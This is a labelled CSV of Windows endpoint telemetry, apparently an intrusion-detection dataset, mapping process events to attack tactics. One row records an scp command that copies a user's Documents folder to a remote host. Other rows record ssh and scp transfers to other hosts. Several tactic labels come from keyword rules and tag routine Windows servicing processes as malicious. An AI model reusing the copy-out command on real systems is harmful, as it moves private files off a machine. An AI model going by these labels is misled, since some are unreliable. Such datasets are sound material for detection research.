event_type,tactic,tactic_idx,ts_ns,ts_sec,ts_human,uuid,subject_uuid,object_uuid,exe,pid,ppid,cmdline,file_path,remote_addr,remote_port,local_addr,local_port,bytes,registry_key,event_name,source,raw_text,tactic_refined,resolution_source
EVENT_READ,Discovery,8,1.55792E+18,1557923164,2019-05-15 12:26:03 UTC,883b5c369e10450cab10439583482812,5b92d99669d044bd8fb37a1b83ecea83,0d392dfc32ad4372b57357af448e2c57,,3488,b'\xec\xee\xe3\xac\xb8\xecO\xb0\x8f\t\xd27\x7f\x85*%',scp  -r C:\Users\admin\Documents admin@128.55.12.106:./files/,\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_READ | pid=3488 | cmd=scp  -r C:\Users\admin\Documents admin@128.55.12.106:./files/ | path=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\,Lateral_Movement,rule:cmdline_lateral
EVENT_READ,Discovery,7,1.55792E+18,1557923171,2019-05-15 12:26:11 UTC,e993ea782a9e46269d184ae9755c25d5,21bf08ebc71c4b9ebcbb3f22713358f3,0d392dfc32ad4372b57357af448e2c57,,4364,b'~)\xc6\xb9\x0e\x88H\xbe\xbbG\xe8V\xadtVX',"""C:\Program Files\TightVNC\tvnserver.exe"" -desktopserver -logdir ""C:\WINDOWS\system32\config\systemprofile\AppData\Roaming\TightVNC"" -loglevel 0 -shmemname Global\iiwqbuayqqvkptsardsi",\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,"type=EVENT_READ | pid=4364 | cmd=""C:\Program Files\TightVNC\tvnserver.exe"" -desktopserver -logdir ""C:\WINDOWS\system32\config\systemprofile\AppData\Roami | path=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\",Discovery,primary
EVENT_RECVFROM,Initial_Access,1,1.55792E+18,1557923163,2019-05-15 12:26:02 UTC,bfae8a5f0f3d4d9b993bf426da9bf707,4e4bf5ac0d634570907a8a4410484f38,f726805d72dd4f898d2237e1bd4c239e,,5784,b'[\x92\xd9\x96i\xd0D\xbd\x8f\xb3z\x1b\x83\xec\xea\x83',"""C:\Program Files\OpenSSH-Win64\ssh.exe"" ""-x"" ""-oForwardAgent=no"" ""-oPermitLocalCommand=no"" ""-oClearAllForwardings=yes"" ""-l"" ""admin"" ""--"" ""128.55.12.106"" ""scp -r -t ./files/""",,,,,,38,,,SOURCE_WINDOWS_FIVEDIRECTIONS,"type=EVENT_RECVFROM | pid=5784 | cmd=""C:\Program Files\OpenSSH-Win64\ssh.exe"" ""-x"" ""-oForwardAgent=no"" ""-oPermitLocalCommand=no"" ""-oClearAllForwardings=yes""  | bytes=38",Initial_Access,primary
EVENT_MODIFY_FILE_ATTRIBUTES,Persistence,2,1.55792E+18,1557923083,2019-05-15 12:24:43 UTC,bfaff52405fb4b1e9befe292eac099ad,159f6820e57b4a629e2dafdbbaae724f,cec4a85af102493f83e293e7f352db9a,,3920,b'l0h\xe6DQO\x8d\x831\x81\xec\xb0\x89N\x17',\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,\REGISTRY\MACHINE\SOFTWARE\Microsoft\Ole\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_MODIFY_FILE_ATTRIBUTES | pid=3920 | cmd=\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1 | path=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Ole\,Execution,rule:cmdline_malware
EVENT_WRITE,Persistence,3,1.55792E+18,1557923099,2019-05-15 12:24:59 UTC,c7b35c98b1834b87b2fc6a7f4372d3ab,d323362646424c9bbc8225173fb09615,83c7c76c590a4edd9895f77ced2fbe38,,8456,b'\x8d\xf7\x0b\xa8~zF\xfe\x8ep\xa4q.\xc1-\x1a',C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.16299.96_none_2c40cc7f3876f2b7\TiWorker.exe -Embedding,\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_WRITE | pid=8456 | cmd=C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.16299.96_none_2c40cc7f3876f2b7\TiWorker.e | path=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\,Persistence,primary
EVENT_UNLINK,Defense_Evasion,5,1.55792E+18,1557923220,2019-05-15 12:27:00 UTC,0cbc3ee7c98a40cc871a0c6d2eefa606,9a1c6fe2f3c44f6d80a9d6fbdf9c8c97,341f0b1e95254005aedbbf216d242ef2,,2452,b'\xda\x81-^7\xfbB+\xb6\xd8\xdaw)\x89u\xce',C:\WINDOWS\servicing\TrustedInstaller.exe,\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\TiRunning\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_UNLINK | pid=2452 | cmd=C:\WINDOWS\servicing\TrustedInstaller.exe | path=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\TiRunning\,Defense_Evasion,primary
EVENT_READ,Discovery,6,1.55792E+18,1557923111,2019-05-15 12:25:10 UTC,0f920c2516b5457cbd8d0887615fded8,f4ef553afe374279a076fc072475b6c9,522abc6fe8274b1cbf018f697129c82c,,7980,b'\xb7nmy\xaa]L\xdd\x96\xc4Z\xa5\x17\x88\xff\xf7',"""C:\Program Files\OpenSSH-Win64\sshd.exe""",\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Winsock\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,"type=EVENT_READ | pid=7980 | cmd=""C:\Program Files\OpenSSH-Win64\sshd.exe"" | path=\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Winsock\",Credential_Access,rule:credential_path
EVENT_READ,Discovery,7,1.55792E+18,1557923089,2019-05-15 12:24:48 UTC,1385818bc1f640fd9716600ecd5a391c,d323362646424c9bbc8225173fb09615,4beb86339ee742e4850acf7307cf8f0f,,8456,b'\x8d\xf7\x0b\xa8~zF\xfe\x8ep\xa4q.\xc1-\x1a',C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.16299.96_none_2c40cc7f3876f2b7\TiWorker.exe -Embedding,\REGISTRY\MACHINE\SOFTWARE\Classes\AppID\TiWorker.exe\,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_READ | pid=8456 | cmd=C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.16299.96_none_2c40cc7f3876f2b7\TiWorker.e | path=\REGISTRY\MACHINE\SOFTWARE\Classes\AppID\TiWorker.exe\,Discovery,primary
EVENT_CONNECT,Command_and_Control,8,1.55792E+18,1557923540,2019-05-15 12:32:20 UTC,bd535353bb054e37b5d9419bb78085f7,28dade4b81da4fa28eeefbc6346e9b25,6dd3201a29514c6bb938481e77fab550,,8428,b'\xa4\xeb\xfe\x05e0N\x85\xb9\xda\xe7\xa2\x82L\xcc6',ssh  admin@128.55.12.56,,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,type=EVENT_CONNECT | pid=8428 | cmd=ssh  admin@128.55.12.56,Lateral_Movement,rule:cmdline_lateral
EVENT_CONNECT,Command_and_Control,10,1.55792E+18,1557923608,2019-05-15 12:33:28 UTC,d4f7b53adc1944e687e39f791f9b74e8,7282d2487def42e0840b56ae4bcd5aae,dadea4b192b7494385307d2c88cb6588,,9448,b'\x07%/\xaf\xb3\xacCp\x85\x1dH\xa1{\x9d\x98`',"""C:\Program Files\OpenSSH-Win64\ssh.exe"" ""-x"" ""-oForwardAgent=no"" ""-oPermitLocalCommand=no"" ""-oClearAllForwardings=yes"" ""-l"" ""admin"" ""--"" ""128.55.12.67"" ""scp -r -t C:/Windows/Temp""",,,,,,,,,SOURCE_WINDOWS_FIVEDIRECTIONS,"type=EVENT_CONNECT | pid=9448 | cmd=""C:\Program Files\OpenSSH-Win64\ssh.exe"" ""-x"" ""-oForwardAgent=no"" ""-oPermitLocalCommand=no"" ""-oClearAllForwardings=yes"" ",Command_and_Control,primary
